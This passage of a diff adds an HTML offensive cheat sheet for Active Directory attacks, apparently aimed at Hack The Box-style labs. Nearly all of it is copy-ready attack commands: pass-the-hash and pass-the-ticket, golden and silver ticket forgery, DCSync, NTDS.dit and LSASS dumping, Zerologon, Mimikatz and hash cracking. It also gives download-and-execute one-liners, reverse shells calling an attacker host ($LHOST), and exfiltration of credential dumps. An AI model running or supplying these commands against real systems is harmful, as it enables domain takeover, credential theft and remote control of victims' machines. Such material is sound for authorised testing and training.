+        <span class="cm"># GenericWrite on User — targeted Kerberoast or logon script</span>
+        Set-DomainObject -Identity target_user -Set @{'serviceprincipalname'='fake/spn'} <span class="cm"># add SPN →
+          Kerberoast</span>
+        Set-DomainObject -Identity target_user -Set @{'scriptpath'='\\$LHOST\share\malicious.bat'}
+
+        <span class="cm"># WriteOwner — take ownership, then full control</span>
+        Set-DomainObjectOwner -Identity target -OwnerIdentity compromised_user
+        Add-DomainObjectAcl -TargetIdentity target -PrincipalIdentity compromised_user -Rights All
+
+        <span class="cm"># WriteDACL — add DCSync rights</span>
+        Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=htb" -PrincipalIdentity compromised_user -Rights DCSync
+
+        <span class="cm"># ForceChangePassword</span>
+        Set-DomainUserPassword -Identity target -AccountPassword (ConvertTo-SecureString 'NewPass!' -AsPlainText -Force)
+
+        <span class="cm"># Impacket tools for ACL abuse</span>
+        impacket-owneredit -action write -new-owner compromised_user -target target_object
+        domain.htb/compromised_user:pass -dc-ip $DC
+        impacket-dacledit -action write -rights FullControl -principal compromised_user -target target_object
+        domain.htb/compromised_user:pass -dc-ip $DC
+      </div>
+    </div>
+    <h3 class="md-h3" id="84-pass-the-hash-pth">8.4 Pass-the-Hash (PtH)</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># CrackMapExec</span>
+        crackmapexec smb $IP -u administrator -H 'NTLM_HASH'
+        crackmapexec smb $IP/24 -u administrator -H 'NTLM_HASH' --continue-on-success <span class="cm"># spray
+          subnet</span>
+        crackmapexec smb $IP -u administrator -H 'NTLM_HASH' -x "whoami"
+        crackmapexec winrm $IP -u administrator -H 'NTLM_HASH'
+
+        <span class="cm"># Evil-WinRM</span>
+        evil-winrm -i $IP -u administrator -H 'NTLM_HASH'
+
+        <span class="cm"># Impacket tools</span>
+        impacket-psexec -hashes :NTLM_HASH administrator@$IP
+        impacket-smbexec -hashes :NTLM_HASH administrator@$IP
+        impacket-wmiexec -hashes :NTLM_HASH administrator@$IP
+        impacket-atexec -hashes :NTLM_HASH administrator@$IP cmd.exe "whoami"
+
+        <span class="cm"># xfreerdp PtH</span>
+        xfreerdp /v:$IP /u:administrator /pth:NTLM_HASH /d:domain.htb /cert:ignore
+      </div>
+    </div>
+    <h3 class="md-h3" id="85-pass-the-ticket-ptt">8.5 Pass-the-Ticket (PtT)</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Get a TGT or TGS</span>
+        .\Rubeus.exe tgtdeleg /nowrap <span class="cm"># use current TGT</span>
+        .\Rubeus.exe asktgt /user:user /rc4:HASH /domain:domain.htb /ptt
+        .\Rubeus.exe asktgs /service:cifs/target /ticket:BASE64 /ptt
+
+        <span class="cm"># Import ticket with Mimikatz</span>
+        .\mimikatz.exe
+        kerberos::ptt ticket.kirbi
+
+        <span class="cm"># Impacket — use ticket</span>
+        export KRB5CCNAME=/path/to/ticket.ccache
+        impacket-psexec -k -no-pass domain.htb/user@target.domain.htb
+        impacket-smbclient -k -no-pass domain.htb/user@target.domain.htb
+
+        <span class="cm"># Convert ticket formats (kirbi ↔ ccache)</span>
+        impacket-ticketConverter ticket.kirbi ticket.ccache
+        impacket-ticketConverter ticket.ccache ticket.kirbi
+      </div>
+    </div>
+    <h3 class="md-h3" id="86-overpass-the-hash-pass-the-key">8.6 Overpass-the-Hash / Pass-the-Key</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Overpass-the-hash: use NTLM hash to get Kerberos ticket</span>
+        .\Rubeus.exe asktgt /user:user /rc4:NTLM_HASH /domain:domain.htb /ptt
+        .\Rubeus.exe asktgt /user:user /aes256:AES256_KEY /domain:domain.htb /ptt /opsec
+
+        <span class="cm"># Mimikatz</span>
+        .\mimikatz.exe
+        sekurlsa::pth /user:user /domain:domain.htb /ntlm:NTLM_HASH /run:cmd.exe
+
+        <span class="cm"># Impacket — get TGT</span>
+        impacket-getTGT domain.htb/user -hashes :NTLM_HASH -dc-ip $DC
+        impacket-getTGT domain.htb/user -aesKey AES256_KEY -dc-ip $DC
+        export KRB5CCNAME=user.ccache
+      </div>
+    </div>
+    <h3 class="md-h3" id="87-golden-ticket">8.7 Golden Ticket</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Requirements: krbtgt hash, domain SID</span>
+
+        <span class="cm"># Get krbtgt hash (after DCSync or DC compromise)</span>
+        impacket-secretsdump domain.htb/administrator:pass@$DC
+        <span class="cm"># or: .\mimikatz.exe "lsadump::dcsync /domain:domain.htb /user:krbtgt" exit</span>
+
+        <span class="cm"># Get domain SID</span>
+        impacket-lookupsid domain.htb/user:pass@$DC | grep "Domain SID"
+        <span class="cm"># or: wmic useraccount get name,sid (from Windows)</span>
+
+        <span class="cm"># Forge Golden Ticket with Impacket</span>
+        impacket-ticketer -nthash KRBTGT_NTLM_HASH -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX -domain
+        domain.htb administrator
+
+        <span class="cm"># Use the ticket</span>
+        export KRB5CCNAME=administrator.ccache
+        impacket-psexec -k -no-pass domain.htb/administrator@$DC
+
+        <span class="cm"># Forge with Mimikatz (from Windows)</span>
+        .\mimikatz.exe
+        kerberos::golden /domain:domain.htb /sid:S-1-5-21-... /rc4:KRBTGT_HASH /user:administrator /ticket:golden.kirbi
+        kerberos::ptt golden.kirbi
+      </div>
+    </div>
+    <h3 class="md-h3" id="88-silver-ticket">8.8 Silver Ticket</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Requirements: target service account hash, domain SID, SPN</span>
+
+        <span class="cm"># Forge Silver Ticket (CIFS service)</span>
+        impacket-ticketer -nthash SERVICE_NTLM_HASH -domain-sid S-1-5-21-XXXXXXXXXX -domain domain.htb -spn
+        cifs/target.domain.htb administrator
+
+        <span class="cm"># Common SPNs for silver tickets</span>
+        <span class="cm"># cifs/target.domain.htb → file access (SMB)</span>
+        <span class="cm"># http/target.domain.htb → web access</span>
+        <span class="cm"># mssql/target.domain.htb → SQL Server access</span>
+        <span class="cm"># host/target.domain.htb → WMI, remote access</span>
+
+        <span class="cm"># Use</span>
+        export KRB5CCNAME=administrator.ccache
+        impacket-smbclient -k -no-pass domain.htb/administrator@target.domain.htb
+
+        <span class="cm"># Mimikatz silver ticket</span>
+        .\mimikatz.exe
+        kerberos::golden /domain:domain.htb /sid:S-1-5-21-... /rc4:SERVICE_HASH /user:administrator /service:cifs
+        /target:target.domain.htb /ticket:silver.kirbi
+        kerberos::ptt silver.kirbi
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="phase-9-lateral-movement" style="margin-top:36px"><span class="sec-title">Phase 9 — Lateral
+        Movement</span><span class="sec-line"></span></div>
+    <h3 class="md-h3" id="91-psexec-impacket-execution">9.1 PsExec / Impacket Execution</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Impacket psexec (creates service, gets SYSTEM)</span>
+        impacket-psexec administrator:password@$IP
+        impacket-psexec -hashes :NTLM_HASH administrator@$IP
+        impacket-psexec -k -no-pass domain.htb/administrator@$IP <span class="cm"># Kerberos</span>
+
+        <span class="cm"># smbexec (uses service, no upload)</span>
+        impacket-smbexec administrator:password@$IP
+        impacket-smbexec -hashes :NTLM_HASH administrator@$IP
+
+        <span class="cm"># wmiexec (WMI — less noisy)</span>
+        impacket-wmiexec administrator:password@$IP
+        impacket-wmiexec -hashes :NTLM_HASH administrator@$IP
+        impacket-wmiexec -k -no-pass domain.htb/administrator@$IP
+
+        <span class="cm"># atexec (scheduled task execution)</span>
+        impacket-atexec administrator:password@$IP "whoami"
+        impacket-atexec -hashes :NTLM_HASH administrator@$IP "cmd /c whoami &gt; C:\Temp\out.txt"
+
+        <span class="cm"># CrackMapExec execution</span>
+        crackmapexec smb $IP -u admin -p pass -x "whoami" <span class="cm"># cmd</span>
+        crackmapexec smb $IP -u admin -p pass -X "whoami" <span class="cm"># PowerShell</span>
+        crackmapexec smb $IP -u admin -p pass --exec-method smbexec -x "whoami"
+      </div>
+    </div>
+    <h3 class="md-h3" id="92-sysinternals-psexec">9.2 Sysinternals PsExec</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">cmd</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">:: Windows PsExec
+        PsExec.exe \\target -u administrator -p password cmd.exe
+        PsExec.exe \\target -u domain\admin -p password -s cmd.exe :: as SYSTEM
+
+        :: Pass credentials
+        net use \\target\ipc$ "password" /u:domain\user
+        PsExec.exe \\target cmd.exe</div>
+    </div>
+    <h3 class="md-h3" id="93-wmi-lateral-movement">9.3 WMI Lateral Movement</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">powershell</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># From Windows — WMI exec</span>
+        Invoke-WmiMethod -ComputerName target -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami &gt;
+        C:\out.txt"
+        $cred = Get-Credential
+        Invoke-WmiMethod -ComputerName target -Credential $cred -Class Win32_Process -Name Create -ArgumentList
+        "C:\Temp\shell.exe"
+
+        <span class="cm"># wmic</span>
+        wmic /node:$IP /user:domain\admin /password:pass process call create "cmd /c whoami &gt; C:\Temp\out.txt"
+      </div>
+    </div>
+    <h3 class="md-h3" id="94-pass-the-hash-with-mimikatz">9.4 Pass-the-Hash with Mimikatz</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">cmd</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">:: Mimikatz sekurlsa::pth — spawn process with different creds
+        .\mimikatz.exe
+        sekurlsa::pth /user:administrator /domain:domain.htb /ntlm:NTLM_HASH /run:"cmd.exe"
+        :: New cmd window opens — connected as administrator via PtH</div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="phase-10-domain-compromise-dcsync" style="margin-top:36px"><span class="sec-title">Phase 10
+        — Domain Compromise & DCSync</span><span class="sec-line"></span></div>
+    <h3 class="md-h3" id="101-dcsync-attack">10.1 DCSync Attack</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Requires: Domain Admin, DA-equivalent, or DCSync rights (GetChangesAll +
+          GetChanges)</span>
+
+        <span class="cm"># Impacket secretsdump — remote DCSync</span>
+        impacket-secretsdump domain.htb/administrator:pass@$DC
+        impacket-secretsdump -hashes :NTLM_HASH domain.htb/administrator@$DC
+        impacket-secretsdump -just-dc domain.htb/administrator:pass@$DC <span class="cm"># only DC</span>
+        impacket-secretsdump -just-dc-user krbtgt domain.htb/administrator:pass@$DC <span class="cm"># krbtgt
+          only</span>
+
+        <span class="cm"># Mimikatz DCSync (from Windows with DA)</span>
+        .\mimikatz.exe
+        lsadump::dcsync /domain:domain.htb /all /csv
+        lsadump::dcsync /domain:domain.htb /user:administrator
+        lsadump::dcsync /domain:domain.htb /user:krbtgt
+
+        <span class="cm"># CrackMapExec DCSync</span>
+        crackmapexec smb $DC -u administrator -p pass --ntds
+        crackmapexec smb $DC -u administrator -H NTLM_HASH --ntds
+        crackmapexec smb $DC -u administrator -p pass --ntds --users
+      </div>
+    </div>
+    <h3 class="md-h3" id="102-ntdsdit-extraction">10.2 NTDS.dit Extraction</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Shadow copy method (from Windows)</span>
+        vssadmin create shadow /for=C:
+        cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Temp\NTDS.dit
+        cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
+
+        <span class="cm"># Or with CrackMapExec / ntdsutil</span>
+        crackmapexec smb $DC -u admin -p pass --ntds vss <span class="cm"># via VSS</span>
+
+        <span class="cm"># Dump with ntdsutil</span>
+        ntdsutil "activate instance ntds" "ifm" "create full C:\Temp\IFM" quit quit
+        <span class="cm"># Copy C:\Temp\IFM\Active Directory\ntds.dit and SYSTEM hive</span>
+
+        <span class="cm"># Parse NTDS.dit on Kali</span>
+        impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
+        impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL -outputfile hashes.txt
+      </div>
+    </div>
+    <h3 class="md-h3" id="103-zerologon-cve-2020-1472">10.3 Zerologon (CVE-2020-1472)</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Check vulnerability</span>
+        python3 zerologon_tester.py NETBIOS_NAME $DC
+
+        <span class="cm"># Exploit (sets DC computer account password to empty)</span>
+        python3 cve-2020-1472-exploit.py NETBIOS_NAME $DC
+
+        <span class="cm"># DCSync with empty password</span>
+        impacket-secretsdump -just-dc -no-pass domain.htb/NETBIOS_NAME\$@$DC
+
+        <span class="cm"># IMPORTANT: Restore DC password after exploitation!</span>
+        impacket-reinstall_original_pw NETBIOS_NAME $DC hex_original_password
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="phase-11-credential-dumping-loot" style="margin-top:36px"><span class="sec-title">Phase 11
+        — Credential Dumping & Loot</span><span class="sec-line"></span></div>
+    <h3 class="md-h3" id="111-lsass-dump">11.1 LSASS Dump</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Task Manager GUI (if RDP access)</span>
+        <span class="cm"># Right-click lsass.exe → Create Dump File</span>
+
+        <span class="cm"># ProcDump (Sysinternals — less AV detection)</span>
+        .\procdump.exe -ma lsass.exe C:\Temp\lsass.dmp
+        .\procdump.exe -ma -r lsass.exe C:\Temp\lsass.dmp <span class="cm"># reflective (AV bypass)</span>
+
+        <span class="cm"># Comsvcs.dll method</span>
+        C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID C:\Temp\lsass.dmp full
+
+        <span class="cm"># From PowerShell</span>
+        $process = Get-Process lsass
+        [System.Runtime.InteropServices.Marshal]::WriteInt32([System.Runtime.InteropServices.Marshal]::AllocHGlobal(4),
+        $process.Id)
+        <span class="cm"># Better to use tool-based approaches</span>
+
+        <span class="cm"># Mimikatz direct LSASS (needs debug privilege)</span>
+        .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
+        .\mimikatz.exe "privilege::debug" "sekurlsa::wdigest" exit <span class="cm"># cleartext</span>
+        .\mimikatz.exe "privilege::debug" "sekurlsa::tickets" exit <span class="cm"># Kerberos</span>
+
+        <span class="cm"># Parse dump offline on Kali with pypykatz</span>
+        pip3 install pypykatz
+        pypykatz lsa minidump lsass.dmp
+        pypykatz lsa minidump lsass.dmp | tee parsed_lsass.txt
+      </div>
+    </div>
+    <h3 class="md-h3" id="112-sam-registry-hives">11.2 SAM / Registry Hives</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">cmd</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">:: Export registry hives
+        reg save HKLM\SAM C:\Temp\SAM
+        reg save HKLM\SYSTEM C:\Temp\SYSTEM
+        reg save HKLM\SECURITY C:\Temp\SECURITY
+
+        :: Parse on Kali
+        impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
+
+        :: With CrackMapExec
+        crackmapexec smb $IP -u admin -p pass --sam
+        crackmapexec smb $IP -u admin -p pass --lsa <span class="cm"># LSA secrets</span></div>
+    </div>
+    <h3 class="md-h3" id="113-mimikatz-full-reference">11.3 Mimikatz Full Reference</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">cmd</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">:: Privilege
+        privilege::debug
+
+        :: LSASS / logon passwords
+        sekurlsa::logonpasswords
+        sekurlsa::wdigest
+        sekurlsa::kerberos
+        sekurlsa::tspkg
+        sekurlsa::msv
+        sekurlsa::livessp
+        sekurlsa::ssp
+
+        :: Kerberos tickets
+        sekurlsa::tickets
+        sekurlsa::tickets /export
+        kerberos::list
+        kerberos::list /export
+        kerberos::purge
+        kerberos::ptt ticket.kirbi
+
+        :: Golden / Silver
+        kerberos::golden /domain:domain.htb /sid:S-1-5-21-... /rc4:KRBTGT_HASH /user:administrator /ticket:golden.kirbi
+        kerberos::silver /domain:domain.htb /sid:S-1-5-21-... /rc4:SERVICE_HASH /user:administrator /service:cifs
+        /target:host.domain.htb /ticket:silver.kirbi
+
+        :: SAM / LSA
+        lsadump::sam
+        lsadump::lsa /patch
+        lsadump::secrets
+        lsadump::cache
+
+        :: DCSync
+        lsadump::dcsync /domain:domain.htb /user:krbtgt
+        lsadump::dcsync /domain:domain.htb /all /csv
+
+        :: DPAPI
+        sekurlsa::dpapi <span class="cm"># masterkeys</span>
+        dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
+        dpapi::cred /in:"credential_file"
+
+        :: Token manipulation
+        token::list
+        token::elevate
+        token::elevate /domainadmin
+        token::revert</div>
+    </div>
+    <h3 class="md-h3" id="114-hash-cracking">11.4 Hash Cracking</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Identify hash type</span>
+        hash-identifier &lt;hash&gt;
+        hashid &lt;hash&gt;
+
+        <span class="cm"># Hashcat modes</span>
+        hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt <span class="cm"># NTLM</span>
+        hashcat -m 3000 lm.txt /usr/share/wordlists/rockyou.txt <span class="cm"># LM</span>
+        hashcat -m 5600 netntlmv2.txt /usr/share/wordlists/rockyou.txt <span class="cm"># NTLMv2</span>
+        hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt <span class="cm"># Kerberoast (TGS-REP)</span>
+        hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt <span class="cm"># AS-REP</span>
+        hashcat -m 1800 sha512crypt.txt /usr/share/wordlists/rockyou.txt <span class="cm"># sha512crypt</span>
+        hashcat -m 500 md5crypt.txt /usr/share/wordlists/rockyou.txt <span class="cm"># md5crypt</span>
+
+        <span class="cm"># Rules</span>
+        hashcat -m 1000 ntlm.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+        hashcat -m 1000 ntlm.txt rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule
+
+        <span class="cm"># John</span>
+        john ntlm.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
+        john kerberoast.txt --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt
+        john asrep.txt --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt
+        john --show ntlm.txt
+      </div>
+    </div>
+    <h3 class="md-h3" id="115-flags">11.5 Flags</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">cmd</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">:: User flag
+        type C:\Users\user\Desktop\user.txt
+        dir /s /b user.txt 2&gt;nul
+
+        :: Root / Admin flag
+        type C:\Users\Administrator\Desktop\root.txt
+        type C:\Administrator\Desktop\root.txt
+        dir /s /b root.txt 2&gt;nul</div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="file-transfer-techniques" style="margin-top:36px"><span class="sec-title">File Transfer
+        Techniques</span><span class="sec-line"></span></div>
+    <h3 class="md-h3" id="from-kali-windows">From Kali → Windows</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Python HTTP server</span>
+        python3 -m http.server 80
+
+        <span class="cm"># PowerShell download</span>
+        powershell -c "(New-Object Net.WebClient).DownloadFile('http://$LHOST/file.exe','C:\Temp\file.exe')"
+        powershell -c "IWR http://$LHOST/file.exe -OutFile C:\Temp\file.exe"
+        powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/script.ps1')"
+
+        <span class="cm"># Certutil</span>
+        certutil.exe -urlcache -split -f http://$LHOST/file.exe C:\Temp\file.exe
+        certutil.exe -decode encoded.b64 file.exe
+
+        <span class="cm"># Bitsadmin</span>
+        bitsadmin /transfer job /download /priority high http://$LHOST/file.exe C:\Temp\file.exe
+
+        <span class="cm"># SMB server</span>
+        impacket-smbserver share . -smb2support
+        <span class="cm"># On Windows:</span>
+        copy \\$LHOST\share\file.exe C:\Temp\file.exe
+        net use Z: \\$LHOST\share
+      </div>
+    </div>
+    <h3 class="md-h3" id="from-windows-kali">From Windows → Kali</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># SMB upload</span>
+        impacket-smbserver share . -smb2support -username user -password pass
+        <span class="cm"># On Windows:</span>
+        net use Z: \\$LHOST\share /user:user pass
+        copy file.txt Z:\
+      </div>
+    </div>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">cmd</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">:: PowerShell upload via POST
+        Invoke-WebRequest -Uri "http://$LHOST/upload" -Method POST -Body (Get-Content -Raw -Path C:\file.txt)
+
+        :: Certutil base64 encode
+        certutil.exe -encode C:\file.exe encoded.b64
+        :: Copy base64 text, decode on Kali:
+        base64 -d encoded.b64 &gt; file.exe
+
+        :: SMB (from Windows after net use)
+        copy C:\Temp\lsass.dmp Z:\</div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="shells-listeners" style="margin-top:36px"><span class="sec-title">Shells &
+        Listeners</span><span class="sec-line"></span></div>
+    <h3 class="md-h3" id="windows-reverse-shells">Windows Reverse Shells</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">powershell</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># PowerShell reverse shell (one-liner)</span>
+        powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('$LHOST',$LPORT);$stream =
+        $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne
+        0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data
+        2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte =
+        ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+        <span class="cm"># ConPtyShell (fully interactive PowerShell — best option)</span>
+        <span class="cm"># On Kali:</span>
+        stty raw -echo; (stty size; cat) | nc -lvnp $LPORT
+        <span class="cm"># On Windows:</span>
+        IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/Invoke-ConPtyShell.ps1')
+        Invoke-ConPtyShell $LHOST $LPORT
+
+        <span class="cm"># Nishang reverse shell</span>
+        IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/Invoke-PowerShellTcp.ps1')
+        Invoke-PowerShellTcp -Reverse -IPAddress $LHOST -Port $LPORT
+
+        <span class="cm"># CMD reverse shell via nc</span>
+        .\nc.exe $LHOST $LPORT -e cmd.exe
+
+        <span class="cm"># MSFVenom (see Phase 5)</span>
+        msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe
+      </div>
+    </div>
+    <h3 class="md-h3" id="listeners">Listeners</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Netcat</span>
+        nc -lvnp $LPORT
+        rlwrap nc -lvnp $LPORT <span class="cm"># better arrow keys</span>
+
+        <span class="cm"># Metasploit multi/handler</span>
+        msfconsole -q
+        use exploit/multi/handler
+        set PAYLOAD windows/x64/shell_reverse_tcp
+        set LHOST $LHOST
+        set LPORT $LPORT
+        set ExitOnSession false
+        run -j
+
+        <span class="cm"># Socat (fully interactive)</span>
+        socat file:`tty`,raw,echo=0 TCP-LISTEN:$LPORT
+        <span class="cm"># On Windows:</span>
+        .\socat.exe TCP:$LHOST:$LPORT EXEC:cmd.exe,pty,stderr,setsid,sigint,sane
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="wordlists-resources" style="margin-top:36px"><span class="sec-title">Wordlists &
+        Resources</span><span class="sec-line"></span></div>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Passwords</span>
+        /usr/share/wordlists/rockyou.txt
+        /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
+        /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt
+
+        <span class="cm"># Usernames</span>
+        /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+        /usr/share/seclists/Usernames/Names/names.txt
+
+        <span class="cm"># Web</span>
+        /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
+        /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt
+        /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt
+
+        <span class="cm"># DNS</span>
+        /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+      </div>
+    </div>
+    <h3 class="md-h3" id="key-references-tools">Key References & Tools</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># References</span>
+        GTFOBins (Windows): https://lolbas-project.github.io
+        LOLBAS: https://lolbas-project.github.io
+        HackTricks AD: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
+        PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
+        BloodHound: https://github.com/BloodHoundAD/BloodHound
+        Impacket: https://github.com/SecureAuthCorp/impacket
+
+        <span class="cm"># Tool Download Locations</span>
+        WinPEAS: https://github.com/carlospolop/PEASS-ng/releases
+        Rubeus: https://github.com/GhostPack/Rubeus
+        SharpHound: https://github.com/BloodHoundAD/SharpHound
+        Mimikatz: https://github.com/gentilkiwi/mimikatz
+        PowerView: https://github.com/PowerShellMafia/PowerSploit
+        PowerUp: https://github.com/PowerShellMafia/PowerSploit
+        Seatbelt: https://github.com/GhostPack/Seatbelt
+        GodPotato: https://github.com/BeichenDream/GodPotato
+        PrintSpoofer: https://github.com/itm4n/PrintSpoofer
